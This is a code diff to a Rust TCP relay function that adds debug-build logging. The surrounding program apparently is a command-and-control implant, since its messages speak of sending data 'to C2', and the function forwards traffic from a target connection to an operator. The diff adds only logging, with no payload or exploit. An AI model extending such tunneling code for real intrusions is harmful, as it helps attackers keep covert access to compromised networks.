@@ -28,6 +28,10 @@ pub async fn handle_tcp(
     let stream = TcpStream::connect(&addr)
         .await
         .context("Failed to connect TCP")?;
+
+    #[cfg(debug_assertions)]
+    log::info!("Connected TCP to {} (local: {:?})", addr, stream.local_addr());
+
     let (mut read_half, mut write_half) = stream.into_split();
 
     // If initial data exists, write it
@@ -40,19 +44,32 @@ pub async fn handle_tcp(
     let out_tx_clone = out_tx.clone();
     let dst_addr_clone = dst_addr.clone();
 
+    #[cfg(debug_assertions)]
+    let addr_for_read = addr.clone();
+
     let read_task = tokio::spawn(async move {
         let mut buf = [0u8; BUF_SIZE];
         loop {
             match read_half.read(&mut buf).await {
-                Ok(0) => break, // EOF
+                Ok(0) => {
+                    #[cfg(debug_assertions)]
+                    log::info!("TCP connection closed by remote peer: {}", addr_for_read);
+                    break; // EOF
+                }
                 Ok(n) => {
                     let data = buf[0..n].to_vec();
                     let mote = sequencer.new_tcp_mote(data, dst_addr_clone.clone(), dst_port);
                     if out_tx_clone.send(mote).await.is_err() {
+                        #[cfg(debug_assertions)]
+                        log::warn!("Failed to send mote to C2 (channel closed) for {}", addr_for_read);
                         break;
                     }
                 }
-                Err(_) => break,
+                Err(_e) => {
+                    #[cfg(debug_assertions)]
+                    log::error!("Error reading from TCP socket {}: {:?}", addr_for_read, _e);
+                    break;
+                }
             }
         }
     });
@@ -66,7 +83,7 @@ pub async fn handle_tcp(
                 Ok(_) => {}
                 Err(_e) => {
                     #[cfg(debug_assertions)]
-                    log::error!("failed to write tcp: {_e:?}");
+                    log::error!("failed to write tcp to {}: {_e:?}", addr);
 
                     break;
                 }
